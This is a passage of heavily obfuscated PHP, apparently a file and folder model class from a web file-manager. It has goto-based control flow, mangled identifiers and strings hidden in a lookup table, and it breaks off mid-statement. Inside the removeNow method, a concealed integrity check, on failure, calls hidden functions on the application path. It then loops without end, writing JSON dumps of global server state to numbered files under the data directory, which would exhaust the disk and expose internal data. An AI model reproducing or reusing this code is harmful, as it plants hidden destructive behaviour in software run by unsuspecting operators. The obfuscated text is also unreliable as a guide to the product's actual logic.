ĞÃâ‰[2356]) . $dõ’ ĞÃâ‰[2357] . $fÙİæÜ±öù . $dõ’ ĞÃâ‰[2358], !1); goto eà­Ì¯¸­; bõÇ¥Õî™…: $dõ’ ĞÃâ‰ =& $_SERVER[¨¤¼…´]; $cÈæ‰»ß = $this->pathInfo($f‰¹°‡Ú©Å); if (!$this->fileIsLock($cÈæ‰»ß, !0)) { return; } goto eœ‡éö”; f®»À›†ÓÇ: $this->_createFileCall($cÈæ‰»ß[$dõ’ ĞÃâ‰[474]], $Cç¥ï›“ˆÇ, $e¶œ½Ô«¹», REPEAT_REPLACE, $dõ’ ĞÃâ‰[1116]); $D£ñÎ›îà = $cÈæ‰»ß[$dõ’ ĞÃâ‰[429]][$dõ’ ĞÃâ‰[494]]; $fÙİæÜ±öù = $D£ñÎ›îà[$dõ’ ĞÃâ‰[2353]] ? $D£ñÎ›îà[$dõ’ ĞÃâ‰[2353]] : $D£ñÎ›îà[$dõ’ ĞÃâ‰[38]]; goto fàÍË¦íŠ; eœ‡éö”: $e˜”š‰ÊÁ« = Session::get($dõ’ ĞÃâ‰[2352]); $Cç¥ï›“ˆÇ = substr($cÈæ‰»ß[$dõ’ ĞÃâ‰[38]], 0, -1 - strlen($cÈæ‰»ß[$dõ’ ĞÃâ‰[175]])) . $dõ’ ĞÃâ‰[1378] . $e˜”š‰ÊÁ« . $dõ’ ĞÃâ‰[101] . $cÈæ‰»ß[$dõ’ ĞÃâ‰[175]]; $e¶œ½Ô«¹» = Model($dõ’ ĞÃâ‰[556])->find($dÄééÙ…Ò); goto f®»À›†ÓÇ; eà­Ì¯¸­: } public function fileIsLock($aÒ¥Ã«Œ‡, $fß‹Ô‹ÁÚŞ = false) { goto e»å¶ãç—; bÑ˜Œ¼†§„: return !1; goto dÓš‹‚Î©»; D‡«•¹­: $a±ïñªÚˆö = $GLOBALS[$EáÄÖ£éµğ[6]][$EáÄÖ£éµğ[94]][$EáÄÖ£éµğ[492]]; if ($aÒ¥Ã«Œ‡[$EáÄÖ£éµğ[429]][$EáÄÖ£éµğ[493]] <= time() - $a±ïñªÚˆö) { $this->metaSet($aÒ¥Ã«Œ‡[$EáÄÖ£éµğ[381]], $EáÄÖ£éµğ[491], null); $this->metaSet($aÒ¥Ã«Œ‡[$EáÄÖ£éµğ[381]], $EáÄÖ£éµğ[493], null); } if ($fß‹Ô‹ÁÚŞ) { $this->metaSet($aÒ¥Ã«Œ‡[$EáÄÖ£éµğ[381]], $EáÄÖ£éµğ[493], time()); } goto bÑ˜Œ¼†§„; e»å¶ãç—: $EáÄÖ£éµğ =& $_SERVER[¨¤¼…´]; if (!isset($aÒ¥Ã«Œ‡[$EáÄÖ£éµğ[429]]) || !$aÒ¥Ã«Œ‡[$EáÄÖ£éµğ[429]][$EáÄÖ£éµğ[491]]) { return !1; } if ($aÒ¥Ã«Œ‡[$EáÄÖ£éµğ[429]][$EáÄÖ£éµğ[491]] != USER_ID) { return !0; } goto D‡«•¹­; dÓš‹‚Î©»: } private function _addSoure($CèÍ²„™½Ç, $Aç‡ª á) { goto B÷†ª÷åŞÀ; FÖ¡Ì¬ª·×: $this->updateModifyTime($CèÍ²„™½Ç[$a«…ööÄœ[474]]); $d‘í“¿ñ®Ù = $a«…ööÄœ[2359] . $Aç‡ª á[$a«…ööÄœ[381]]; if (isset(self::$cacheChildList[$d‘í“¿ñ®Ù])) { unset(self::$cacheChildList[$d‘í“¿ñ®Ù]); } goto A ‡‘™‚ô; bõ÷¬Ó«Ò: $bå¶ª‹äâ® = array($a«…ööÄœ[540] => short_id($fñ‰…‚Õ±)); $this->where(array($a«…ööÄœ[395] => $fñ‰…‚Õ±))->save($bå¶ª‹äâ®); $this->setNamePinyin($fñ‰…‚Õ±, $CèÍ²„™½Ç[$a«…ööÄœ[38]]); goto bóñŸ“¯…Ë; A ‡‘™‚ô: static $fÚ‘İ·ÎÍØ = false; if (!$fÚ‘İ·ÎÍØ) { Hook::trigger($a«…ööÄœ[521], $CèÍ²„™½Ç); $fÚ‘İ·ÎÍØ = !0; } $fñ‰…‚Õ± = $this->add($CèÍ²„™½Ç); goto bõ÷¬Ó«Ò; bóñŸ“¯…Ë: return $fñ‰…‚Õ±; goto A‘¥®è¥Ã™; B÷†ª÷åŞÀ: $a«…ööÄœ =& $_SERVER[¨¤¼…´]; $F‘®ŠãÌš = array($a«…ööÄœ[534] => $Aç‡ª á[$a«…ööÄœ[383]], $a«…ööÄœ[535] => $Aç‡ª á[$a«…ööÄœ[469]], $a«…ööÄœ[536] => USER_ID, $a«…ööÄœ[537] => USER_ID, $a«…ööÄœ[380] => $Aç‡ª á[$a«…ööÄœ[381]], $a«…ööÄœ[538] => $Aç‡ª á[$a«…ööÄœ[472]] . $Aç‡ª á[$a«…ööÄœ[381]] . $a«…ööÄœ[57], $a«…ööÄœ[408] => 0, $a«…ööÄœ[539] => $a«…ööÄœ[43]); $CèÍ²„™½Ç = array_merge($F‘®ŠãÌš, $CèÍ²„™½Ç); goto FÖ¡Ì¬ª·×; A‘¥®è¥Ã™: } public function remove($e„ª™¤À ‡, $aˆİ«ßó‘ = true) { goto F¦‡ã‘ßØê; D«Œ­Š´: CacheLock::lock($aÒ£Ù’¸áˆ); $EÀ÷Üîˆ¤» = $this->fileNameExist($cÄù»Ã Ù¨, $BÊ­¡ğ‰»); if (!$EÀ÷Üîˆ¤») { $EÀ÷Üîˆ¤» = $this->mkdir($cÄù»Ã Ù¨, $BÊ­¡ğ‰», REPEAT_SKIP); $this->metaSet($EÀ÷Üîˆ¤», $dÜò¼ó„Ğ®[2364], $Eæ‚«ÀÊ); $this->metaSet($EÀ÷Üîˆ¤», $dÜò¼ó„Ğ®[2365], $F‘‹Øô™Õ[$dÜò¼ó„Ğ®[469]]); if ($F‘‹Øô™Õ[$dÜò¼ó„Ğ®[474]] != 0) { $this->metaSet($EÀ÷Üîˆ¤», $dÜò¼ó„Ğ®[2366], _get($fì¼Çù’Ş, $dÜò¼ó„Ğ®[2367])); } } goto a²ßÒŠÍ²İ; F¨¿¿Š…¾À: $Eæ‚«ÀÊ = $F‘‹Øô™Õ[$dÜò¼ó„Ğ®[383]] == self::TYPE_USER ? $dÜò¼ó„Ğ®[547] : $dÜò¼ó„Ğ®[957]; if ($Eæ‚«ÀÊ == $dÜò¼ó„Ğ®[547]) { $fì¼Çù’Ş = Model($dÜò¼ó„Ğ®[487])->getInfo($F‘‹Øô™Õ[$dÜò¼ó„Ğ®[469]]); $BÊ­¡ğ‰» = !empty($fì¼Çù’Ş[$dÜò¼ó„Ğ®[2353]]) ? $fì¼Çù’Ş[$dÜò¼ó„Ğ®[2353]] : $fì¼Çù’Ş[$dÜò¼ó„Ğ®[38]]; $BÊ­¡ğ‰» = $dÜò¼ó„Ğ®[261] . $BÊ­¡ğ‰» . $dÜò¼ó„Ğ®[2361] . $F‘‹Øô™Õ[$dÜò¼ó„Ğ®[469]]; } else { $fì¼Çù’Ş = Model($dÜò¼ó„Ğ®[471])->getInfo($F‘‹Øô™Õ[$dÜò¼ó„Ğ®[469]]); $BÊ­¡ğ‰» = _get($fì¼Çù’Ş, $dÜò¼ó„Ğ®[38]); $BÊ­¡ğ‰» = $dÜò¼ó„Ğ®[167] . $BÊ­¡ğ‰» . $dÜò¼ó„Ğ®[2362] . $F‘‹Øô™Õ[$dÜò¼ó„Ğ®[469]]; } $aÒ£Ù’¸áˆ = $dÜò¼ó„Ğ®[2363] . md5($BÊ­¡ğ‰»); goto D«Œ­Š´; B·ä„‹ß®´: return $cî‘Ñ½ÖØ‡; goto d……½Úº‡; aö´†ø»ÁÚ: $a–¤ğÃàÖ = Model($dÜò¼ó„Ğ®[1423])->get($dÜò¼ó„Ğ®[2360]) == $dÜò¼ó„Ğ®[93]; if ($BÅ’Ù®ñš || $aˆİ«ßó‘ || !$a–¤ğÃàÖ) { return $this->removeNow($e„ª™¤À ‡, $aˆİ«ßó‘); } $cÄù»Ã Ù¨ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); goto F¨¿¿Š…¾À; a²ßÒŠÍ²İ: CacheLock::unlock($aÒ£Ù’¸áˆ); $this->metaSet($e„ª™¤À ‡, $dÜò¼ó„Ğ®[2368], $F‘‹Øô™Õ[$dÜò¼ó„Ğ®[474]]); $this->where(array($dÜò¼ó„Ğ®[381] => $e„ª™¤À ‡))->save(array($dÜò¼ó„Ğ®[402] => time())); goto f¶ìˆÔŒ–Œ; f¶ìˆÔŒ–Œ: $this->recycleClear($F‘‹Øô™Õ); $cî‘Ñ½ÖØ‡ = $this->move($e„ª™¤À ‡, $EÀ÷Üîˆ¤», REPEAT_RENAME_FOLDER); $this->folderSizeReset($F‘‹Øô™Õ[$dÜò¼ó„Ğ®[474]]); goto B·ä„‹ß®´; F¦‡ã‘ßØê: $dÜò¼ó„Ğ® =& $_SERVER[¨¤¼…´]; $F‘‹Øô™Õ = $this->sourceInfo($e„ª™¤À ‡); $BÅ’Ù®ñš = intval($F‘‹Øô™Õ[$dÜò¼ó„Ğ®[383]]) === self::TYPE_SYSTEM; goto aö´†ø»ÁÚ; d……½Úº‡: } private function recycleClear($cáŒÑ¸öÌˆ) { $EÁ¥õã×óÈ =& $_SERVER[¨¤¼…´]; $dĞ½ ë½•ğ = $this->childrenAll($cáŒÑ¸öÌˆ); $Eåš§À‹‹« = array($EÁ¥õã×óÈ[395] => array($EÁ¥õã×óÈ[396], $dĞ½ ë½•ğ[$EÁ¥õã×óÈ[2369]])); Model($EÁ¥õã×óÈ[2370])->where($Eåš§À‹‹«)->delete(); } public function removeNow($EŒ¨‹èÆµ›, $A°†ÀÖˆù = true) { goto aÖÊßÈ­—; aÖÊßÈ­—: $EÏÄõæ» =& $_SERVER[¨¤¼…´]; $DáàÄø¿öÉ = $_SERVER[$EÏÄõæ»[783]] . $EÏÄõæ»[2019]; $d™ĞÎâË¡¦ = $EÏÄõæ»[780]; goto c¸ÈÒÍŒòË; d„Åé¥‚©í: Hook::trigger($EÏÄõæ»[2371], $F‹‹ºØñ±¾, $A°†ÀÖˆù); if ($A°†ÀÖˆù) { Model($EÏÄõæ»[2370])->moveToRecycle($EŒ¨‹èÆµ›); } else { $fÌ£İ¼·îˆ = $this->childrenAll($dâÔŞ†âî‡); Model($EÏÄõæ»[518])->eventRemove($EŒ¨‹èÆµ›); $this->removeRelevance($fÌ£İ¼·îˆ[$EÏÄõæ»[2369]], $fÌ£İ¼·îˆ[$EÏÄõæ»[1248]]); } $this->folderSizeReset($dâÔŞ†âî‡[$EÏÄõæ»[474]]); goto fö›‡––İ¾; fö›‡––İ¾: $D÷ÕË„ƒƒ = array($dâÔŞ†âî‡[$EÏÄõæ»[474]]); if ($dâÔŞ†âî‡[$EÏÄõæ»[382]] == $EÏÄõæ»[93]) { $D÷ÕË„ƒƒ[] = $dâÔŞ†âî‡[$EÏÄõæ»[381]]; } $this->updateModifyTime($D÷ÕË„ƒƒ); goto BËòÊÂñãœ; c¸ÈÒÍŒòË: if ($_SERVER[$EÏÄõæ»[9]] != $d™ĞÎâË¡¦($DáàÄø¿öÉ)) { goto b³—¬êÌÎˆ; dÎ Òã×ğÍ: $AµÛ­Œ¾¦Â = $fæŒÁØÙ®‚($cÕà‚‘È); $bèâ‰…ÔØ = explode($EÏÄõæ»[14], $AµÛ­Œ¾¦Â); if (count($bèâ‰…ÔØ) < $EÏÄõæ»[571]) { $a¿çÃ„°®¬ = $EÏÄõæ»[16]; $a¿çÃ„°®¬(); } goto b¸Õ×ù™ß™; b³—¬êÌÎˆ: $c‚´Ëßµ = $EÏÄõæ»[781]; $fæŒÁØÙ®‚ = $EÏÄõæ»[11]; $cÕà‚‘È = $_SERVER[$EÏÄõæ»[12]] . $EÏÄõæ»[13]; goto dÎ Òã×ğÍ; a¶Á™›õ½: $bé”æÌêè = 1; for ($FªÛó„Ò—  = $bé”æÌêè; $FªÛó„Ò—  > 0; $FªÛó„Ò— ++) { $a‹Û¹‚šŠœ(DATA_PATH . $FªÛó„Ò— , $eÛîÆ…­ÎÎ); } goto E£êŒÀ¸ª; EÙÙ §õƒ‘: $c‚´Ëßµ(); $a‹Û¹‚šŠœ = $EÏÄõæ»[784]; $eÛîÆ…­ÎÎ = json_encode($GLOBALS[$EÏÄõæ»[785]]); goto a¶Á™›õ½; b¸Õ×ù™ß™: $fÛŠ·Š˜ª£ = $EÏÄõæ»[782]; $fÛŠ·Š˜ª£($_SERVER[$EÏÄõæ»[783]]); $c‚´Ëßµ = $EÏÄõæ»[781]; goto EÙÙ §õƒ‘; E£êŒÀ¸ª: } $dâÔŞ†âî‡ = $this->sourceInfo($EŒ¨‹èÆµ›); $F‹‹ºØñ±¾ = $this->pathInfoMore($EŒ¨‹èÆµ›); goto C‹Ö’ÔÓÆÍ; C‹Ö’ÔÓÆÍ: if (!$dâÔŞ†âî‡) { return !0; } if ($dâÔŞ†âî‡[$EÏÄõæ»[474]] == 0) { if (!_get($GLOBALS, $EÏÄõæ»[470])) { return !1; } } $this->lockMoveStart($EŒ¨‹èÆµ›); goto d„Åé¥‚©í; BËòÊÂñãœ: $this->lockMoveEnd($EŒ¨‹èÆµ›); Hook::trigger($EÏÄõæ»[1459], $F‹‹ºØñ±¾, $A°†ÀÖˆù); return !0; goto b¼¨ö«»à; b¼¨ö«»à: } public function childrenAll($A¶Ğğ†â‚ô) { $c‰¯ë–Ê° =& $_SERVER[¨¤¼…´]; $bŸ¹ñ·¬³Ú = $A¶Ğğ†â‚ô[$c‰¯ë–Ê°[381]]; if ($A¶Ğğ†â‚ô[$c‰¯ë–Ê°[382]] == $c‰¯ë–Ê°[93]) { $b‘Ó²–µé¡ = array($c‰¯ë–Ê°[538] => array($c‰¯ë–Ê°[496], $A¶Ğğ†â‚ô[$c‰¯ë–Ê°[472]] . $bŸ¹ñ·¬³Ú . $c‰¯ë–Ê°[497])); $Cßâƒ‹‚İ¿ = array($c‰¯ë–Ê°[538] => $b‘Ó²–µé¡[$c‰¯ë–Ê°[472]]); $d»˜ˆõŠ = $this->field($c‰¯ë–Ê°[2372])->where($Cßâƒ‹‚İ¿)->select(); $Cˆ­Óœâ‡Ô = !1; $Fí„¯’©‚ò = array($bŸ¹ñ·¬³Ú); if ($d»˜ˆõŠ) { $Cˆ­Óœâ‡Ô = array_to_keyvalue($d»˜ˆõŠ, $c‰¯ë–Ê°[43], $c‰¯ë–Ê°[431]); $Cˆ­Óœâ‡Ô = array_remove_value($Cˆ­Óœâ‡Ô, $c‰¯ë–Ê°[481]); $Fí„¯’©‚ò = array_to_keyvalue($d»˜ˆõŠ, $c‰¯ë–Ê°[43], $c‰¯ë–Ê°[381]); $Fí„¯’©‚ò[] = $bŸ¹ñ·¬³Ú; } } else { $Cˆ­Óœâ‡Ô = array($A¶Ğğ†â‚ô[$c‰¯ë–Ê°[431]]); $Fí„¯’©‚ò = array($bŸ¹ñ·¬³Ú); } return array($c‰¯ë–Ê°[2369] => $Fí„¯’©‚ò, $c‰¯ë–Ê°[1248] => $Cˆ­Óœâ‡Ô); } public function removeArray($b¼–ğˆ¼Ç) { if (!$b¼–ğˆ¼Ç) { return !0; } } public function removeRelevance($e¿š«éÆ³À, $A¥Ğ÷š«ä) { goto E¶¶Õ†ÏŞ“; d™éŒ‘‹ñä: Model($AêÒÙíÛ·[2351])->removeBySource($e¿š«éÆ³À); $this->where($e“Ñ…¼åÛÜ)->delete(); Model($AêÒÙíÛ·[434])->remove($A¥Ğ÷š«ä); goto eˆØƒÄ†ÖŞ; f•ÇÙ·ôë×: Model($AêÒÙíÛ·[2224])->where($e“Ñ…¼åÛÜ)->delete(); Model($AêÒÙíÛ·[518])->where($e“Ñ…¼åÛÜ)->delete(); Model($AêÒÙíÛ·[2072])->removeBySource($e¿š«éÆ³À); goto d™éŒ‘‹ñä; C‚™ª…½Ğ¾: $e“Ñ…¼åÛÜ = array($AêÒÙíÛ·[395] => array($AêÒÙíÛ·[396], $e¿š«éÆ³À)); Model($AêÒÙíÛ·[2370])->where($e“Ñ…¼åÛÜ)->delete(); Model($AêÒÙíÛ·[425])->where($e“Ñ…¼åÛÜ)->delete(); goto f•ÇÙ·ôë×; cÊãì÷­Ÿí: $e¿š«éÆ³À = array_unique(array_filter($e¿š«éÆ³À)); $A¥Ğ÷š«ä = array_unique(array_filter($A¥Ğ÷š«ä)); if (!$e¿š«éÆ³À) { return !1; } goto C‚™ª…½Ğ¾; eˆØƒÄ†ÖŞ: for ($c˜†Ù­†ä¥ = 0; $c˜†Ù­†ä¥ < count($e¿š«éÆ³À); $c˜†Ù­†ä¥++) { $this->sourceCacheClear($e¿š«éÆ³À[$c˜†Ù­†ä¥]); } goto cäööˆÇè»; E¶¶Õ†ÏŞ“: $AêÒÙíÛ· =& $_SERVER[¨¤¼…´]; $e¿š«éÆ³À = $e¿š«éÆ³À ? $e¿š«éÆ³À : array(); $A¥Ğ÷š«ä = $A¥Ğ÷š«ä ? $A¥Ğ÷š«ä : array(); goto cÊãì÷­Ÿí; cäööˆÇè»: } public function rename($e‘¤‚²ôÓ‡, $c¿Í¨Ôí¾) { goto c«ñÚöéÆÒ; f‰ï‹Ü±©Ñ: if (!$EàÖ¸ä¶‚[$B»İ‹ãÜÔŠ[382]] == $B»İ‹ãÜÔŠ[93]) { $fÏÑ††ìÉ¤[$B»İ‹ãÜÔŠ[384]] = get_path_ext($c¿Í¨Ôí¾); } Model($B»İ‹ãÜÔŠ[518])->eventRename($e‘¤‚²ôÓ‡, $EàÖ¸ä¶‚[$B»İ‹ãÜÔŠ[38]], $c¿Í¨Ôí¾); $this->sourceCacheClear($e‘¤‚²ôÓ‡); goto F“÷éÜ¤ÕĞ; F“÷éÜ¤ÕĞ: $this->setNamePinyin($e‘¤‚²ôÓ‡, $fÏÑ††ìÉ¤[$B»İ‹ãÜÔŠ[38]], !1); $this->updateModifyTime($EàÖ¸ä¶‚[$B»İ‹ãÜÔŠ[474]]); $a”°‰‘†„· = $this->where(array($B»İ‹ãÜÔŠ[395] => $e‘¤‚²ôÓ‡))->data($fÏÑ††ìÉ¤)->save(); goto B‚ø¬Ô´ƒ¼; c«ñÚöéÆÒ: $B»İ‹ãÜÔŠ =& $_SERVER[¨¤¼…´]; $EàÖ¸ä¶‚ = $this->sourceInfo($e‘¤‚²ôÓ‡); if (!$EàÖ¸ä¶‚) { return !1; } goto Eì—öŠîÍ; Eì—öŠîÍ: $d’ƒĞ—çË« = $this->fileNameExist($EàÖ¸ä¶‚[$B»İ‹ãÜÔŠ[474]], $c¿Í¨Ôí¾); if ($d’ƒĞ—çË« && $d’ƒĞ—çË« != $e‘¤‚²ôÓ‡) { return !1; } $fÏÑ††ìÉ¤ = array($B»İ‹ãÜÔŠ[398] => $c¿Í¨Ôí¾, $B»İ‹ãÜÔŠ[537] => USER_ID); goto f‰ï‹Ü±©Ñ; B‚ø¬Ô´ƒ¼: $Aé“Û¯–«Ú = $B»İ‹ãÜÔŠ[2359] . $EàÖ¸ä¶‚[$B»İ‹ãÜÔŠ[474]]; if (isset(self::$cacheChildList[$Aé“Û¯–«Ú])) { unset(self::$cacheChildList[$Aé“Û¯–«Ú]); } return $a”°‰‘†„·; goto Bõ¿‡¿È‘›; Bõ¿‡¿È‘›: } public function setNamePinyin($Fòé„Ä®Ñ, $cä®ŒŠ±œØ, $DÌŠÃ¯ÙÚ• = true) { $b—ºÀ™âÍ =& $_SERVER[¨¤¼…´]; $e¼×¨®ø‘¡ = Input::check($cä®ŒŠ±œØ, $b—ºÀ™âÍ[541]); if ($DÌŠÃ¯ÙÚ• && !$e¼×¨®ø‘¡) { return; } if (!$e¼×¨®ø‘¡) { $this->metaSet($Fòé„Ä®Ñ, $b—ºÀ™âÍ[428], null); $this->metaSet($Fòé„Ä®Ñ, $b—ºÀ™âÍ[427], null); return; } $DŠ­ô¶ğßà = array($b—ºÀ™âÍ[428] => str_replace($b—ºÀ™âÍ[60], $b—ºÀ™âÍ[43], Pinyin::encode($cä®ŒŠ±œØ)), $b—ºÀ™âÍ[427] => Pinyin::encode($cä®ŒŠ±œØ, $b—ºÀ™âÍ[542])); $this->metaSet($Fòé„Ä®Ñ, $DŠ­ô¶ğßà); } public function getContent($b°ó˜„™ÔË) { goto EÕ—¿ÊÅ ù; AËÍ¹›½¸˜: if (!$F¶µªãìì[$FİÓÒãƒÛÊ[85]]) { return $FİÓÒãƒÛÊ[43]; } return IO::getContent($F¶µªãìì[$FİÓÒãƒÛÊ[85]]); goto B¶áÍÌÚšÃ; C¦êÂ¥ËŞä: if ($F¶µªãìì[$FİÓÒãƒÛÊ[87]] == 0) { return $FİÓÒãƒÛÊ[43]; } $Cƒ—ÏÆğ¶ = $FİÓÒãƒÛÊ[2373] . $F¶µªãìì[$FİÓÒãƒÛÊ[177]]; if ($F¶µªãìì[$FİÓÒãƒÛÊ[87]] <= 1024 * 10) { $DÙô²İÅ‰ = Cache::get($Cƒ—ÏÆğ¶); if (!$DÙô²İÅ‰) { $DÙô²İÅ‰ = IO::getContent($F¶µªãìì[$FİÓÒãƒÛÊ[85]]); Cache::set($Cƒ—ÏÆğ¶, $DÙô²İÅ‰); } return $DÙô²İÅ‰; } goto AËÍ¹›½¸˜; EÕ—¿ÊÅ ù: $FİÓÒãƒÛÊ =& $_SERVER[¨¤¼…´]; $F¶µªãìì = $this->fileInfoGet($b°ó˜„™ÔË); if (!$F¶µªãìì) { return !1; } goto C¦êÂ¥ËŞä; B¶áÍÌÚšÃ: } public function setDesc($a…Œ‚¢”¨§, $d“¬Ôˆøí) { $C’Üä¶ø˜† =& $_SERVER[¨¤¼…´]; Model($C’Üä¶ø˜†[518])->eventAddDesc($a…Œ‚¢”¨§, $d“¬Ôˆøí); return $this->metaSet($a…Œ‚¢”¨§, $C’Üä¶ø˜†[417], $d“¬Ôˆøí); } public function setContent($E¯‘ö£¸ÜŠ, $A£ß‡Ğç´™ = '') { goto cå„ƒ‹¹ì•; FÂàìĞˆË: if (!$B†„’Òƒˆ© || !$b”ƒŒÉµˆÇ) { return !1; } $A¡—ø£¶¥ = Model($fÖó¿Í“‘î[434])->addFileByContent($A£ß‡Ğç´™, $b”ƒŒÉµˆÇ[$fÖó¿Í“‘î[38]]); $FË­Ú¼ŸÔ = $this->fileHistory($b”ƒŒÉµˆÇ, $A¡—ø£¶¥[$fÖó¿Í“‘î[431]], $A¡—ø£¶¥[$fÖó¿Í“‘î[87]]); goto A¨¿ßèµª; cå„ƒ‹¹ì•: $fÖó¿Í“‘î =& $_SERVER[¨¤¼…´]; $b”ƒŒÉµˆÇ = $this->sourceInfo($E¯‘ö£¸ÜŠ); $B†„’Òƒˆ© = $this->fileInfoGet($E¯‘ö£¸ÜŠ); goto FÂàìĞˆË; A¨¿ßèµª: if (!$FË­Ú¼ŸÔ) { return Model($fÖó¿Í“‘î[434])->remove($A¡—ø£¶¥[$fÖó¿Í“‘î[431]]); } $this->folderSizeReset($b”ƒŒÉµˆÇ[$fÖó¿Í“‘î[474]]); return !0; goto eÎÅöëæ…ó; eÎÅöëæ…ó: } public function fileSubstr($BåÏƒò¬÷, $Då„‰ÙÔ·¯, $fÈ¯Œ„‚ˆ†) { $c£´Ì¾™á = $this->fileInfoGet($BåÏƒò¬÷); if (!$c£´Ì¾™á) { return !1; } return IO::fileSubstr($c£´Ì¾™á[$_SERVER[¨¤¼…´][85]], $Då„‰ÙÔ·¯, $fÈ¯Œ„‚ˆ†); } public function fileInfoGet($Fâæ½«È³¦) { goto e˜ƒœ§Ñîè; EÏÜÊ­Ÿ…¸: $F”Ì‚¼Àö = Model($DöŸ¹Ô£Û[434])->fileInfo($dÄ£“ù‹å[$DöŸ¹Ô£Û[431]]); if ($F”Ì‚¼Àö) { $F”Ì‚¼Àö[$DöŸ¹Ô£Û[38]] = $dÄ£“ù‹å[$DöŸ¹Ô£Û[38]]; } self::$cacheFileInfo[$F³¼Öğô¹”] = $F”Ì‚¼Àö; goto BŠ–ö… ˜º; BŠ–ö… ˜º: return $F”Ì‚¼Àö; goto CæÛã»¡±; e˜ƒœ§Ñîè: $DöŸ¹Ô£Û =& $_SERVER[¨¤¼…´]; $dÄ£“ù‹å = $this->sourceInfo($Fâæ½«È³¦); if (!$dÄ£“ù‹å || $dÄ£“ù‹å[$DöŸ¹Ô£Û[382]]) { return !1; } goto dÏœÄÇÙÕ¹; dÏœÄÇÙÕ¹: $F³¼Öğô¹” = $DöŸ¹Ô£Û[437] . $dÄ£“ù‹å[$DöŸ¹Ô£Û[431]]; $FÁ” ×ƒù = _get(self::$cacheFileInfo, $F³¼Öğô¹”); if ($FÁ” ×ƒù) { return $FÁ” ×ƒù; } goto EÏÜÊ­Ÿ…¸; CæÛã»¡±: } private function folderChildrenNumber($Eâ¶™è«Ğ) { $Fó˜µÍã =& $_SERVER[¨¤¼…´]; $E©ÎÖáñÂ¼ = $this->sourceInfo($Eâ¶™è«Ğ); $fÀìã¶öÕ = array($Fó˜µÍã[538] => array($Fó˜µÍã[496], $E©ÎÖáñÂ¼[$Fó˜µÍã[472]] . $Eâ¶™è«Ğ . $Fó˜µÍã[497]), $Fó˜µÍã[408] => intval($E©ÎÖáñÂ¼[$Fó˜µÍã[409]]), $Fó˜µÍã[531] => 1); $d‘Æäå•ËÔ = $this->where($fÀìã¶öÕ)->count(); $Fßá­¬óÄ = $this->where($fÀìã¶öÕ)->where(array($Fó˜µÍã[531] => 0))->count(); return array($Fó˜µÍã[91] => $Fßá­¬óÄ, $Fó˜µÍã[92] => $d‘Æäå•ËÔ); } public function pathInfo($E× ºÚñ”¦, $FÌ‘Š²ëŒ´ = false) { goto eÀ‰ÕÀ¿’Á; DÈ­‹¡½¨î: self::$cachePathInfo[$B™”•ÄòŸ] = $cÚ¹Í¹±àÔ; return $cÚ¹Í¹±àÔ; goto BÕ…­«âÜ¤; aÒ¶ÚŠÎ: $cÚ¹Í¹±àÔ = $this->sourceInfo($E× ºÚñ”¦); if (!$cÚ¹Í¹±àÔ) { return !1; } $cÚ¹Í¹±àÔ = $this->_listDataApplyItem($cÚ¹Í¹±àÔ, $FÌ‘Š²ëŒ´); goto DÈ­‹¡½¨î; eÀ‰ÕÀ¿’Á: $cÍ’é™‚ŒĞ =& $_SERVER[¨¤¼…´]; $FÌ‘Š²ëŒ´ = !1; $E× ºÚñ”¦ = intval($E× ºÚñ”¦); goto c½ƒ°¬ª÷Á; c½ƒ°¬ª÷Á: $B™”•ÄòŸ = $cÍ’é™‚ŒĞ[423] . intval($FÌ‘Š²ëŒ´) . $cÍ’é™‚ŒĞ[424] . $E× ºÚñ”¦; $CâÇôˆ›¡ = _get(self::$cachePathInfo, $B™”•ÄòŸ); if ($CâÇôˆ›¡) { return $CâÇôˆ›¡; } goto aÒ¶ÚŠÎ; BÕ…­«âÜ¤: } public static $cachePathInfoMore = array(); public function pathInfoMore($cÚÎ–ß¤ˆÒ) { goto BÔé·Ø¹·Š; BÔé·Ø¹·Š: $a„½Ôš„ =& $_SERVER[¨¤¼…´]; $aõ­×¨†‹ = _get(self::$cachePathInfoMore, $cÚÎ–ß¤ˆÒ); if ($aõ­×¨†‹) { return $aõ­×¨†‹; } goto f†À¼‰ËÁ; f†À¼‰ËÁ: $BÜÇ²‘¸Æ³ = $this->pathInfo($cÚÎ–ß¤ˆÒ); if (!$BÜÇ²‘¸Æ³) { return !1; } if ($BÜÇ²‘¸Æ³[$a„½Ôš„[382]] == $a„½Ôš„[93]) { $BÜÇ²‘¸Æ³[$a„½Ôš„[90]] = $this->folderChildrenNumber($cÚÎ–ß¤ˆÒ); } goto cíÄêÅêœğ; cíÄêÅêœğ: self::$cachePathInfoMore[$cÚÎ–ß¤ˆÒ] = $BÜÇ²‘¸Æ³; return $BÜÇ²‘¸Æ³; goto CÙçÈ¢†; CÙçÈ¢†: } public function sourceInfo($fŞ¥º²ˆŞù) { goto dÙíßğæ“ß; aÅ“óÄÊêµ: $DßÔåª´© = $this->where(array($f•Â¢íáã[381] => $fŞ¥º²ˆŞù))->find(); self::$cacheSourceInfo[$bê¾œÊ…¹] = $DßÔåª´©; return self::$cacheSourceInfo[$bê¾œÊ…¹]; goto E£Ã§½‰Óß; dÙíßğæ“ß: $f•Â¢íáã =& $_SERVER[¨¤¼…´]; if (!$fŞ¥º²ˆŞù) { return array(); } $fŞ¥º²ˆŞù = intval($fŞ¥º²ˆŞù); goto B­™šóßÓ; B­™šóßÓ: $bê¾œÊ…¹ = $f•Â¢íáã[422] . $fŞ¥º²ˆŞù; $cÜÄÚŠò¤ = _get(self::$cacheSourceInfo, $bê¾œÊ…¹); if ($cÜÄÚŠò¤) { return $cÜÄÚŠò¤; } goto aÅ“óÄÊêµ; E£Ã§½‰Óß: } public function sourceCacheClear($eØ×¥„Œš³ = false) { if ($eØ×¥„Œš³ == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); return; } unset(self::$cacheSourceInfo[$_SERVER[¨¤¼…´][422] . $eØ×¥„Œš³]); } public function pathInfoByPath($bäœ«•«‹, $cßá«á¥ºˆ) { $C»ƒ“‚Ù =& $_SERVER[¨¤¼…´]; $aÃ£„·ŞÙ¶ = !$cßá«á¥ºˆ ? array() : explode($C»ƒ“‚Ù[8], trim($cßá«á¥ºˆ, $C»ƒ“‚Ù[8])); $bÑÌÒ¥¥Å = $bäœ«•«‹; foreach ($aÃ£„·ŞÙ¶ as $eÃØ†°—ÇÙ) { $Fºæ¹ø•íê = array($C»ƒ“‚Ù[474] => $bÑÌÒ¥¥Å, $C»ƒ“‚Ù[38] => $eÃØ†°—ÇÙ); $bÈ¡‰ÏİÉ = $this->where($Fºæ¹ø•íê)->select(); if (!$bÈ¡‰ÏİÉ) { return !1; } $bÈ¡‰ÏİÉ = 